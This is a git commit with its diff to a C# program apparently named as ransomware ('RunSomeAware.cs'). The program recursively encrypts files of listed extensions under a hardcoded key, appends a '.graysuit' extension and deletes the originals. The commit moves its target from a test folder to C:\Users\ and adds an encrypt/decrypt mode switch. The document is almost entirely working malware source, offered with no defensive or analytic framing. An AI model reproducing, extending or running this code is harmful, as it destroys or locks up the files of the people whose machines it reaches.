50796ea89f662169aa9bb21290adc590c6966c79
Gray Programmerz <hackrefisher@gmail.com>
2021-01-14 18:32:37 +0500

    [Added] mode, [Fixed] Access denied
    You can specify whether you want to encrypt or decrypt files by just changing mode. 
    Examples:
    Mode.Encrypt //it will encrypt files
    Mode.Decrypt //it will decrypt files
    RunSomeAware.cs#L14
    
    Now it will crypts every file according to permission it has.

--- RunSomeAware.cs
+++ RunSomeAware.cs
@@ -9,50 +9,46 @@ class RunSomeAware
 {
     public static string key = "MyPrivateKey";
     public static string CrypterExt = ".graysuit";
-    public static string ParentDirectory = @"C:\Users\gray\Desktop\test";
-    public static string[] AllowedExt = { ".png", ".exe", ".cmd",".html",".7z",".bat",".cpp",".js", ".txt", ".cs", CrypterExt };
-    public static long BytesRead = 0;
+    public static string ParentDirectory = @"C:\Users\";
+    public static string[] AllowedExt = { ".png", ".html", ".7z", ".cpp", ".js", ".txt", CrypterExt };
+    public static Mode mode = Mode.Encrypt;
 
+    public static long BytesRead = 0;
+    public enum Mode {Encrypt=1,Decrypt=0 };
     public static void Main()
     {
         Stopwatch watch = Stopwatch.StartNew();
-        if (Start(ParentDirectory)) Console.WriteLine("Speed:" + (BytesRead / (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024)) + " MB/s");
+        Start(ParentDirectory);
+        watch.Stop();
+        Console.WriteLine("Speed:" + (BytesRead / (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024)) + " MB/s");
     }
-    static bool Start(string ParentDir)
+    static void Start(string ParentDir)
     {
-        if (new DirectoryInfo(ParentDir).Attributes.ToString().ToLower().Contains("reparsepoint,")) return true;
         foreach (string file in Directory.GetFiles(ParentDir))
         {
             if (Contain(new FileInfo(file).Extension, AllowedExt))
             {
-                try
-                {
-                    Crypt(file);
-                    BytesRead += new FileInfo(file).Length;
-                    File.Delete(file);
-                    Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
-                }
-                catch (Exception)
-                {
-                    continue;
-                }
+                Crypt(file, mode);
+                BytesRead += new FileInfo(file).Length;
+                File.Delete(file);
+                Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
             }
         }
-        foreach (string dir in Directory.GetDirectories(ParentDir)) Start(dir);
-        return true;
+        foreach (string dir in Directory.GetDirectories(ParentDir)) try { Start(dir); } catch {}
     }
 
-    static void Crypt(string file)
+    static void Crypt(string file,Mode mode)
     {
+        if (mode == Mode.Encrypt && file.EndsWith(CrypterExt)) throw new Exception("Error! File is already encrypted. FilePath:"+ file);
         using (FileStream filestream = File.Open(file, FileMode.Open, FileAccess.Read))
         {
-            using (FileStream stream = new FileStream(file.EndsWith(CrypterExt) ? file.Replace(CrypterExt, "") : file + CrypterExt, FileMode.Create, FileAccess.Write))
+            using (FileStream stream = new FileStream(mode==Mode.Decrypt ? file.Replace(CrypterExt, "") : file + CrypterExt, FileMode.Create, FileAccess.Write))
             {
                 using (Rijndael AES = new RijndaelManaged())
                 {
                     AES.Key = (new SHA256Managed()).ComputeHash(Encoding.ASCII.GetBytes(key));
                     AES.Mode = CipherMode.ECB;
-                    using (CryptoStream crypto = new CryptoStream(stream, file.EndsWith(CrypterExt) ? AES.CreateDecryptor() : AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    using (CryptoStream crypto = new CryptoStream(stream, mode == Mode.Decrypt ? AES.CreateDecryptor() : AES.CreateEncryptor(), CryptoStreamMode.Write))
                     {
                         byte[] buffer = new byte[filestream.Length];
                         while (filestream.Read(buffer, 0, buffer.Length) > 0)
